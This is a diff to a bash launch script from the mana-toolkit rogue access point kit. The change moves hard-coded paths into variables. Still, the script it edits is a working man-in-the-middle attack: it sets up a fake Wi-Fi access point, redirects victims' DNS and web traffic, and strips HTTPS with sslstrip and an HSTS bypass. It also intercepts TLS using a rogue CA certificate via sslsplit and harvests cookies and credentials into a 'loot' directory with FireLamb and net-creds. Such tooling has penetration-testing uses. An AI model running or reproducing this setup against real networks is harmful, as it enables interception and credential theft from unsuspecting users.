@@ -1,9 +1,13 @@
 #!/bin/bash
+etc=/etc/mana-toolkit
+lib=/usr/lib/mana-toolkit
+loot=/var/lib/mana-toolkit
+share=/usr/share/mana-toolkit
 
 upstream=eth0
 phy=wlan0
-conf=/etc/mana-toolkit/hostapd-mana.conf
-hostapd=/usr/lib/mana-toolkit/hostapd
+conf=$etc/hostapd-mana.conf
+hostapd=$lib/hostapd
 
 hostname WRT54G
 echo hostname WRT54G
@@ -22,7 +26,7 @@ sleep 5
 ifconfig $phy 10.0.0.1 netmask 255.255.255.0
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 
-dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo #-p 0
+dnsmasq -z -C $etc/dnsmasq-dhcpd.conf -i $phy -I lo #-p 0
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 iptables --policy INPUT ACCEPT
@@ -36,15 +40,15 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 #iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
 
 #SSLStrip with HSTS bypass
-cd /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/
-python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log.`date "+%s"`&
+cd $share/sslstrip-hsts/sslstrip2/
+python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.`date "+%s"`&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/
+cd $share/sslstrip-hsts/dns2proxy/
 python dns2proxy.py -i $phy&
 cd -
 
 #SSLSplit
-sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log.`date "+%s"` \
+sslsplit -D -P -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
@@ -82,10 +86,10 @@ iptables -t nat -A PREROUTING -i $phy \
  -j REDIRECT --to-port 10110
 
 # Start FireLamb
-/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &
+$share/firelamb/firelamb.py -i $phy &
 
 # Start net-creds
-python /usr/share/mana-toolkit/net-creds/net-creds.py -i $phy > /var/lib/mana-toolkit/net-creds.log.`date "+%s"`
+python $share/net-creds/net-creds.py -i $phy > $loot/net-creds.log.`date "+%s"`
 
 echo "Hit enter to kill me"
 read
